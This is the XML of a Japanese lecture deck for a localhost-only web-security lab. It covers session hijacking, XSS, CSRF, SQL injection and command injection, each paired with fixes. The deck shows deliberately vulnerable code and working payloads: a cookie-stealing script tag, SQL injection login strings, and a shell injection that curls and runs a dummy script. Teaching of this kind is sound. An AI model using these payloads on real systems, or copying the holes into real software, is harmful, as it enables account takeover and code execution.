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786384"/>
            <a:ext cx="9966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 Application Security Programming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749808" y="205740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Webアプリケーション脆弱性をローカル環境で観察し、防御実装へつなげる講義・演習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49808" y="2971800"/>
            <a:ext cx="9921240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3246120"/>
            <a:ext cx="9418320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Webアプリケーションの代表的な脆弱性を、ローカル環境で観察する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攻撃が成立する「実装上の境界」をコードで確認する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観察した現象を、設計・実装・運用上の対策に結びつける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教材リポジトリ: https://github.com/koide55/webapp-security-programming-handson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8096" y="6163056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https://github.com/koide55/webapp-security-programming-handson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652760" y="634593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 / 72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Webサーバセキュリティ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攻撃者がどのような入力やリクエストを使うのかを知る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Cookie、HTML、SQL、シェルなど、文脈ごとの危険な境界を理解する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実験用Webアプリを使って、脆弱性と対策を往復しながら学ぶ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本演習は防御学習用。公開サーバや第三者サービスには使わない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準備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Webアプリの実験環境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Bottle: 軽量Webフレームワーク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Peewee: Python向けORM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SQLite: ローカルで使えるSQLデータベース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補助サーバ: XSS、CSRF、ダミーペイロードの実験用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GitHubリポジトリから取得し、Python仮想環境またはDockerで起動する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準備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事前準備: VS Codeとターミナル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初心者向けの標準エディタは Visual Studio Code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MicrosoftのPython拡張を入れる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File &gt; Open Folder... で教材リポジトリを開く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Terminal &gt; New Terminal で同じ画面からコマンドを実行する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環境構築後、Pythonの実行環境を聞かれたら .venv を選ぶ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838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経験者は好みのエディタでよいが、講義中の説明はVS Codeを前提にする。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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準備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Frameworks We Use Here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05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Bottle handles routing, forms, cookies, and HTTP responses.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Peewee maps Python models to SQLite tables.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SQLite stores users, sessions, and BBS comments in a local file.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 helper server is used only for local XSS, CSRF, and command-injection labs.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All experiments run on localhost.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基礎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演習1: Bottleを試そう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06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Clone the repository.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Install dependencies in a Python virtual environment.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Start the vulnerable training app.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Open http://localhost:8086/hello/security.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Find the route @get("/hello/&lt;name&gt;") in app/main.py.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83864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Point: A URL path parameter is passed into a Python function and rendered as HTML.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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基礎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演習1: Bottleを試そう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07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1515618"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 301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1241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clone https://github.com/koide55/webapp-security-programming-handson.git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webapp-security-programming-handson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python3 -m venv .venv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 .venv/bin/activate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pip install -r requirements.txt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app/main.py --reset-db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41248" y="3106674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ブラウザで http://localhost:8086/hello/security を開く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app/main.py のルーティングと戻り値を確認する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基礎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演習2: PeeweeとSQLiteを試そう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08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Users and Comments models define database tables.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initialize_database() creates the tables and inserts seed users.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The app stores data in app/data.db.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Seed accounts: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koide / password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alice / alice123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bob / bob123</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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基礎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演習2: PeeweeとSQLiteを試そう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09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1515618"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 301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1241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sqlite3 app/data.db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.tables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.schema users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.schema comments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select userid, username, password, cookie from users;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.quit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41248" y="3106674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Model定義とテーブル定義の対応を見る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平文パスワードが保存されていることを確認する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「動く実装」と「安全な実装」は違うことを確認する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基礎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演習2: データベース操作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Peewee query example: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Users.get_or_none(Users.username == "koide")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SQLite direct query example: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select * from users where username='koide';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Compare ORM-generated access and hand-written SQL.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This difference becomes important in the SQL injection exercise.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基礎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演習2: データベース操作の確認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11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Users はユーザ、パスワード、Cookie情報を持つ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Comments は掲示板コメントと投稿者を持つ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ForeignKeyField により、コメントとユーザが関連づく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考察: DBに保存すべき情報と、保存してはいけない情報を分けて説明する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セッションハイジャックの実験環境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12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HTTPはリクエスト単体では利用者を覚えていない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ログイン状態はCookieとサーバ側の情報で管理される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Cookieが盗まれると、本人になりすましたアクセスが成立しうる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この章では、Cookieの役割と守り方を観察する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HTTPのおさらい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13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ブラウザがHTTPリクエストを送る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WebサーバがHTTPレスポンスを返す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ブラウザがHTMLを解釈して画面を表示する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2770632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観察するもの:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1430" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841248" y="320954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URL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HTTPメソッド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フォームデータ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レスポンス本文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HTTPはステートレス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1回目のリクエストと2回目のリクエストは、そのままでは別物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ログイン後のページでも、サーバは「同じ利用者か」を判断する情報が必要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その代表的な仕組みがCookieによるセッション管理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セッション管理の実装ミスは、なりすましにつながる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ステートレスとステートフル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ステートレス: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リクエストごとに独立して処理する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HTTPの基本的な性質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ステートフル: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過去の状態を使って現在の処理を決める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ログイン状態、買い物かご、投稿者情報など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Webアプリは、ステートレスなHTTPの上にステートフルな体験を作る</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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Cookie and Session Management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After login, the server issues a session-related cookie.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The browser sends the cookie with later requests.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The server uses the cookie value to find the logged-in user.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If the cookie is predictable, stolen, or poorly protected, the session can be abused.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Cookieで守るべきこと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17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セッションIDは十分にランダムにする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Cookieには必要に応じて属性を付ける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HttpOnly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Secure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SameSite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サーバ側で有効期限やログアウトを管理する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本教材では違いを観察しやすいよう、あえて弱い実装を含める</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="136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Session Hijacking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18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 user logs in and receives a cookie.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An attacker obtains the cookie value.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The attacker sends requests with the stolen cookie.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If the server accepts it, the attacker is treated as the victim.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Key idea: Password authentication can be bypassed after the session is stolen.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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セッションハイジャック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19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ログイン成功後のCookieは、本人性を示す重要な情報になる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Cookieをコピーできると、別ブラウザでもログイン状態を再現できる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推測可能なCookie値、JavaScriptから読めるCookie、漏えい時の無対策が危険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演習ではブラウザ開発者ツールでCookieの扱いを観察する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準備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実験用Webアプリケーション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最低限の機能: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サインアップ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ログイン、ログアウト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マイページ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掲示板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問い合わせフォーム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922776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教材化したコードはGitHubに配置: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749808" y="4361688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https://github.com/koide55/webapp-security-programming-handson</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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 Structure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2519553"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1815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22452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app/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main.py          # vulnerable training app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views/bbs.tpl   # BBS template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tools/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attacker_server.py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docs/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setup.md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exercises.md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security-notes.md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slides/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webapp-prosecit-20250727.pdf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749808" y="4110609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The repository includes the app, helper server, setup guide, and exercises.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コードを見てみよう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22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app/main.py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ルーティング、DB操作、Cookie、脆弱な処理をまとめている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app/views/bbs.tpl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掲示板HTMLテンプレート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tools/attacker_server.py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XSS受信、CSRFページ、ダミーペイロード配布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docs/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受講者向け手順と講師向けメモ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="136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基礎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データベース設定・接続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23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1917192"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2385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1642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DBFILE = BASE_DIR / "data.db"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db = SqliteDatabase(str(DBFILE))</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1020" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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class Users(BaseModel):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userid = PrimaryKeyField()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username = CharField(null=True, unique=True)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password = CharField(null=True)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cookie = CharField(null=True)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41248" y="3508248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SQLiteファイルは app/data.db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--reset-db で初期化できる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サインアップ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24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処理の流れ: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フォームから username と password を受け取る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空欄と重複ユーザを確認する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Users.create() でDBに保存する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ログイン画面へ誘導する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566160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観察ポイント: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841248" y="4005072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現状はパスワードを平文保存している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改修課題ではパスワードハッシュ化を検討する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ログイン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25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この教材では、SQLインジェクション演習のために、ログイン処理を意図的に脆弱にしている。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80192" cy="913257"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5006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048256"/>
            <a:ext cx="10149840" cy="6389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sql = "SELECT * FROM users WHERE username='" + username + \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"' and password='" + password + "';"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records = cursor.execute(sql)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841248" y="2943225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成功時はCookieを発行する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実行されたSQLを画面に表示し、危険な連結を観察できる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ログアウト・マイページ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26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/logout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cookie_id を削除する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ログイン画面へ戻す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/mypage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Cookieから現在のユーザを検索する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見つからない場合はログインを求める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840480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考察:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1430" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841248" y="4279392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Cookieの値だけに頼る実装では何が危険か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セッション失効はどこで管理すべきか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演習3: セッションハイジャック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27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通常ウィンドウで koide としてログインする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別ブラウザまたはシークレットウィンドウで alice としてログインする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それぞれで http://localhost:8086/cookies を開く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Cookieをコピーして、別ウィンドウで再読み込みする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表示されるユーザがどう変わるか観察する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838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目的: Cookieがログイン状態を表すことを理解する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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WebアプリでCookieを確認する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28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手順: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ログインする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ナビゲーションの Cookie を開く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 header を見る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cookie_id の見え方 を見る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別ブラウザの値と比較する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922776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確認する値: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841248" y="4361688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ブラウザに保存されている cookie_id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署名検証後にアプリが使う値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DB上で対応するユーザ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HTTP/COOKIE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演習3 発展: 署名付きCookieを比較する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29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app/main.py の次の指定を観察する。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80192" cy="712470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 641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048256"/>
            <a:ext cx="1014984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response.set_cookie("cookie_id", cookie_id, secret=COOKIE_SECRET)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request.get_cookie("cookie_id", secret=COOKIE_SECRET)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749808" y="2742438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考察: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181350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secret がある場合、任意の user1 へ単純に書き換えられるか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secret を外すと何が変わるか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HttpOnly や SameSite を付けると何が守れるか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XSSの実験環境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30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掲示板に投稿された文字列がHTMLとして表示される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エスケープを無効にすると、投稿内のJavaScriptが実行される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CookieをJavaScriptから読める場合、外部へ送信される危険がある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補助サーバで送信先をローカルに用意する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BBS 1/3: ルーティング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31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1314831"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 347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10405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@get("/bbs")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bbs_form():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user = current_user()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comments = Comments.select().order_by(Comments.commentid)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return template("bbs", username=user.username, comments=comments)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41248" y="2905887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ログイン中ユーザをCookieから取得する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DBからコメント一覧を取得する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テンプレートにユーザ名とコメントを渡す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BBS 2/3: 投稿処理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32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1515618"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 301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1241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@post("/bbs")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post_bbs():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user = current_user()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comment = request.forms.decode().get("comment", "")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Comments.create(user=user, comment=comment, datetime=now)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redirect("/bbs")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41248" y="3106674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フォーム入力をDBへ保存する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入力値そのものはこの時点ではHTMLではない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危険になるのは「表示するときの文脈」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BBS 3/3: 表示処理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33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621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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{{!comment.comment}}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41248" y="2212848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! はBottleテンプレートのエスケープ無効化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ユーザ入力がHTMLとして解釈される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XSS演習のために意図的に残している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" y="3557016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安全な方向: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49808" y="3995928"/>
            <a:ext cx="10680192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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417880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{{comment.comment}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Cross-Site Scripting Attack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34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The victim opens a trusted web page.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The trusted page includes attacker-controlled script.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The browser runs the script in the trusted page context.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Cookies, page content, and actions may be abused.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Important: The script runs because the trusted site reflected or stored unsafe input.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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クロスサイトスクリプティング攻撃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35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よく使うサイトに、攻撃者が制御するスクリプトが混入する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ブラウザはそのサイトのスクリプトとして実行してしまう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Cookieや画面上の情報が読み取られることがある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原因は「入力値」ではなく「出力時の文脈処理」にある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HTMLを見てみる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36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掲示板の表示結果を開発者ツールで確認する。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普通の文字列はテキストとして表示される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&lt;script&gt; を投稿するとタグとして解釈される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{{!comment.comment}} が危険な表示を許している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20954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考察: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保存時に消すべきか、表示時にエスケープすべきか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HTML、属性、JavaScriptで必要な対策は同じか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お手軽な補助サーバ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37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712470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 641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 .venv/bin/activate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tools/attacker_server.py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41248" y="2303526"/>
            <a:ext cx="1046988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http://localhost:8090/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Cookie文字列を受信してログ表示する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http://localhost:8090/csrf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CSRF実験ページ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http://localhost:8090/badscript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• 無害なダミーペイロード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 Simple Local Helper Site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38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Run tools/attacker_server.py.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Use http://localhost:8090/?cookie_id=... as the XSS destination.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The received values are recorded in stolen_cookies.log.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This helper is for local classroom experiments only.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参考: 余分なコメントを削除する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39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XSS演習後、DBを直接操作して投稿を消せます。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80192" cy="712470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 641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048256"/>
            <a:ext cx="1014984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sqlite3 app/data.db \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"delete from comments where comment like '&lt;script&gt;%';"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749808" y="2742438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またはDBを初期化します。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49808" y="3181350"/>
            <a:ext cx="10680192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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336423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app/main.py --reset-db --init-only</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="102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演習4: XSS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40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Webアプリでログインし、BBSを開く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補助サーバを起動する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次のコメントを投稿する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770632"/>
            <a:ext cx="10680192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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953512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&lt;script&gt;document.location="http://localhost:8090/?cookie_id="+document.cookie&lt;/script&gt;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841248" y="3557016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http://localhost:8090 で受信結果を見る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なぜCookieが読めたのか説明する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演習4 発展: XSSを説明する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41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調べて説明するもの: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補助サーバの役割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SQLiteの役割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掲示板テンプレートの危険な箇所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Cookie属性の役割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出力時エスケープの意味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922776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まとめ方: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749808" y="4361688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「原因となる実装」「観察できた現象」「対策」を表にする</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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CSRF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CSRFの実験環境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42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ブラウザは、対象サイトへのリクエストにCookieを自動で付ける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別サイト上のフォームからでも、対象サイトへPOSTできる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サーバが正当な画面からの操作か検証しないと、意図しない操作が成立する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掲示板投稿を例に観察する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CSRF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クロスサイトリクエストフォージェリ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43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利用者が掲示板にログインしている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同じブラウザで別サイトを開く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別サイトが掲示板へのPOSTフォームを送る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ブラウザは掲示板のCookieを自動で付ける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掲示板側で検証しなければ投稿される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838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対策: CSRFトークン、Origin/Referer検証、SameSite Cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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CSRF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補助サーバ: CSRFページ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44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tools/attacker_server.py の /csrf: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80192" cy="1917192"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2385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048256"/>
            <a:ext cx="10149840" cy="1642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@get("/csrf")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csrf_page():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return page("CSRF Demo", """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&lt;form action="http://localhost:8086/bbs" method="post"&gt;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&lt;input type="hidden" name="comment" value="[CSRF] ..."&gt;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&lt;button type="submit"&gt;実行&lt;/button&gt;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&lt;/form&gt;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""")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="102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CSRFページのHTML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45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1314831"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 347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10405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&lt;form action="http://localhost:8086/bbs" method="post"&gt;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&lt;input type="hidden" name="token" value="a73+f*&amp;t5"&gt;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&lt;input type="hidden" name="comment" value="[CSRF] 悪性サイトから投稿されました"&gt;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&lt;button type="submit"&gt;実行&lt;/button&gt;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&lt;/form&gt;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41248" y="2905887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固定トークンは守りにならない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サーバ側で予測不能なトークンを検証する必要がある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CSRF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演習5: CSRF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46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Webアプリを起動する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補助サーバを起動する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掲示板にログインしておく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同じブラウザで http://localhost:8090/csrf を開く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ボタンを押す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掲示板を確認する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840480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考察: なぜ別サイトからの投稿なのにCookieが送信されたのか</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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SQLインジェクションの実験環境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47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安全なORM利用から、危険な文字列連結SQLへ切り替えて観察する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ユーザ入力がSQL文の一部として解釈される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ログイン画面で、入力値と実行SQLの関係を見る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プレースホルダを使う改修課題につなげる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脆弱にする実装の方針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48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安全な方向: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ORMの条件式を使う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プレースホルダを使う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入力値とSQL構造を分離する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20954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演習用の危険な方向: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SQL文字列を手で組み立てる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ユーザ入力をそのまま連結する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エラーや実行SQLを観察できるようにする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loginを脆弱にしてみる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49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1515618"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 301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1241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username = request.forms.decode().get("username", "")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password = request.forms.decode().get("password", "")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1020" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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sql = "SELECT * FROM users WHERE username='" + username + \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"' and password='" + password + "';"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records = cursor.execute(sql)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41248" y="3106674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入力値がSQL構文を壊せる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app/main.py では演習用にこの実装を残している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演習6: SQLインジェクション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50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ログイン画面で試す例:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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1865376"/>
          <a:ext cx="10680192" cy="1152144"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5340096"/>
                <a:gridCol w="534009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username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password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11182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koide</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="96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11182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' or 'a'='a</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="96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11182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koide' --</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="96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11182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anything</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="96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749808" y="3182112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確認するもの:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1430" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841248" y="3621024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画面に表示された実行SQL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認証が成立した理由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プレースホルダに置き換えた場合の違い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コマンドインジェクションの実験環境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51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問い合わせフォームに、意図的に危険なシェル呼び出しを入れている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ユーザ入力がOSコマンドの一部として解釈される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演習では無害なファイル作成とダミーペイロードだけを扱う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本来は os.system() ではなく専用ライブラリを使う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コマンドインジェクション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52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危険な流れ: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Webフォームに入力する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アプリが入力値をシェルコマンドへ連結する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シェルが区切り文字や引用符を解釈する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予定外のコマンドが実行される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566160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ポイント: SQLiやXSSと同じく、データがコードとして解釈される</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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データとコマンドの境界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53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危険な文字の例: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|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&amp;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#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922776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これらは、単なる文字列ではなく、シェルにとって構文上の意味を持つ。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749808" y="4361688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対策: シェルを経由しない。引数配列で渡す。専用APIを使う。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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安全な実装の考え方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54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避ける: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80192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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048256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os.system("command " + user_input)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749808" y="2651760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選ぶ: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49808" y="3090672"/>
            <a:ext cx="10680192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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3273552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subprocess.run(["command", user_input], shell=False)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749808" y="3877056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さらに良い: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4315968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メール送信には smtplib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ファイル操作には pathlib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DB操作にはプレースホルダやORM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脆弱な問い合わせ機能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55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712470"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 641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command = f'/bin/echo "From: {address}\n{comment}" &gt;&gt; "{OUTBOX_FILE}"'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exit_code = os.system(command)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41248" y="2303526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comment がシェルに解釈される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本来はメール送信ライブラリやファイルAPIを使うべき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教材では実行コマンドを画面に表示し、境界の破れを観察する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ダミーペイロード配布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56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補助サーバの /badscript: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80192" cy="1114044"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4104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048256"/>
            <a:ext cx="10149840" cy="8397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Path("badscript_ran.txt").write_text(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"dummy payload executed\n",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encoding="utf-8",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841248" y="3144012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実害のないファイル作成だけを行う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コマンドインジェクションの「ダウンロードして実行」の流れを安全に観察する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準備確認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57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確認するURL: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Webアプリ: http://localhost:8086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補助サーバ: http://localhost:8090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ダミーペイロード: http://localhost:8090/badscript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20954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確認するファイル:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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app/data.db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app/mail_outbox.txt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stolen_cookies.log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badscript_ran.txt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コマンドインジェクションを観察する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58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問い合わせフォームのコメント欄に入力する例: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80192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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048256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"; /bin/echo injected &gt; command_injection_result.txt; #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749808" y="2651760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補助サーバを使う例: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49808" y="3090672"/>
            <a:ext cx="10680192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353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3273552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"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #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749808" y="3877056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ローカル演習以外では実行しない。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コマンドインジェクションの対策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59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そもそもシェルを呼ばない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文字列連結でコマンドを作らない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shell=False と引数配列を使う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入力値をコマンド構文として扱わない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実行権限とファイル権限を最小にする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ログに実行内容を残し、異常を検知する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演習7: コマンドインジェクション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60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Webアプリにログインする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/contact を開く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無害なファイル作成例を試す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画面に表示された実行コマンドを読む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os.system() を使わない実装へ改修する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838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考察:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1430" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="841248" y="3922776"/>
            <a:ext cx="10469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どの文字がシェル構文として解釈されたか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どこで入力値とコマンドを分離すべきか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Pico.cssでシンプルに整えよう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61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セキュリティ演習でも、使いやすいUIは重要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入力欄、エラー表示、導線が整理されると、観察もしやすくなる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大きいUIキットではなく、Pico.cssを使う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セマンティックHTMLにCSSを1枚足すだけで、フォームや表が整う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なぜPico.cssか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62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1行のlinkで始められる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クラス名をたくさん覚えなくてよい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label、input、button、table、nav が自然に整う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Bottleの素朴なテンプレートと相性がよい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UI改善とセキュリティ対策を混ぜずに説明しやすい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ディレクトリ配置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63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Pico.css適用のサンプル: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80192" cy="2117979"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2159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048256"/>
            <a:ext cx="10149840" cy="18436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app/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static/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app.css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main.py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views/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base.tpl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login.tpl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examples/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pico-css/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749808" y="4147947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サンプルコードは examples/pico-css/ に置いてある。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main.pyに静的ファイル配信を追加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64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1314831"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3477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10405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from bottle import static_file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1020" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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@get("/static/&lt;filepath:path&gt;")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static_files(filepath):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return static_file(filepath, root=str(BASE_DIR / "static"))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749808" y="2905887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ログイン画面をテンプレートに移す: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49808" y="3344799"/>
            <a:ext cx="10680192" cy="913257"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5006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527679"/>
            <a:ext cx="10149840" cy="6389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@get("/login")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login_form():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return template("login", error=None)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="102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base.tpl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65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2680970"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1705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24066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&lt;!doctype html&gt;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&lt;html lang="ja"&gt;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&lt;head&gt;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&lt;meta charset="utf-8"&gt;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&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;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&lt;meta name="color-scheme" content="light dark"&gt;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&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css"&gt;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&lt;link rel="stylesheet" href="/static/app.css"&gt;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&lt;title&gt;{{title or "WebApp Security"}}&lt;/title&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;main class="container"&gt;{{!base}}&lt;/main&gt;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&lt;/body&gt;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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="86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login.tpl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66 / 72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49808" y="1426464"/>
            <a:ext cx="10680192" cy="2511679"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1820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09344"/>
            <a:ext cx="10149840" cy="22373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% rebase("base.tpl", title="Login")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="860" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pP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&lt;article&gt;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&lt;h1&gt;Login&lt;/h1&gt;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% if error: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&lt;p role="alert" class="notice-error"&gt;{{error}}&lt;/p&gt;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% end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&lt;form action="/login" method="post"&gt;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&lt;label&gt;Username &lt;input name="username" required&gt;&lt;/label&gt;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&lt;label&gt;Password &lt;input name="password" type="password" required&gt;&lt;/label&gt;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&lt;button type="submit"&gt;Login&lt;/button&gt;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&lt;/form&gt;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&lt;/article&gt;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49808" y="4102735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Pico.cssがフォーム要素を自動的に整える。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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演習8: Pico.cssでUI改善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67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examples/pico-css/ のサンプルを確認する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static/app.css と views/base.tpl を追加する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login 画面をテンプレート化する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他の画面も少しずつテンプレートへ移す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UI改善後も、SQLi、XSS、CSRFの挙動がどう変わるか確認する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演習9として脆弱性対策を1つずつ実装する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840480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最終目標: 動くアプリから、安全に説明できる教材へ育てる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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91C1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演習9: 改修課題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68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次の対策を1つずつ実装し、攻撃が通らなくなることを確認する。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ログインSQLをプレースホルダに置き換える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BBS表示でHTMLエスケープを有効にする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Cookieに HttpOnly と SameSite=Lax を付ける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CSRFトークンをセッションごとに生成し、POST時に検証する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/contact から os.system() を取り除く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パスワードをハッシュ化して保存する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91C1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パスワードをハッシュ化して保存する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69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パスワードを平文のままDBに保存しない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単なるSHA-256ではなく、ソルト付きで計算コストのある方式を使う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実務ではArgon2、bcrypt、scryptなどを優先する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この演習の最小構成では hashlib.pbkdf2_hmac() を使える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保存値には、方式、反復回数、ソルト、ハッシュ値を含める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838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ログイン時はユーザー名で取得し、入力パスワードを verify_password() で検証する。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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91C1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解答と講師用ヒントの分離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70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受講者向け: docs/exercises.md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経験者向け: docs/advanced-tasks.md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脆弱性と対策の対応表: docs/security-notes.md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解答例: docs/solutions.md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講師用ヒント: docs/instructor-hints.md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838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演習中は、受講者にすぐ解答を見せず、必要に応じて講師用ヒントから段階的に補助する。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="143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91C1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片付けとWindows対応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71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9808" y="1426464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演習で生成されるファイル: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41248" y="1865376"/>
            <a:ext cx="1046988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app/data.db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app/mail_outbox.txt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stolen_cookies.log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command_injection_result.txt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downloaded_badscript.py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badscript_ran.txt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4279392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Windows標準環境では make が通常入っていないため、片付けは次を使う。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49808" y="4718304"/>
            <a:ext cx="10680192" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7353"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3F4F6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901184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 tools/clean.py</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="102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91C1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91C1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52120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まとめ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170432"/>
            <a:ext cx="109728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37376"/>
            <a:ext cx="10972800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651052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webapp-security-programming-handson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808208" y="65013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72 / 72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41248" y="1426464"/>
            <a:ext cx="10469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Webアプリの脆弱性は、入力値が別の文脈で解釈されるところに生まれやすい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Cookie、HTML、SQL、シェル、パスワード保存は、それぞれ守り方が違う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観察してから直すことで、対策の意味を説明しやすくなる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• 最後は「原因となる実装」「観察できた現象」「対策」を表にまとめる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Application Security Programming</dc:title>
  <dc:subject>Web Application Security Programming Hands-on</dc:subject>
  <dc:creator>Codex</dc:creator>
  <cp:lastModifiedBy>Codex</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-17T04:08:27Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-17T04:08:27Z</dcterms:modified>
</cp:coreProperties>
</file>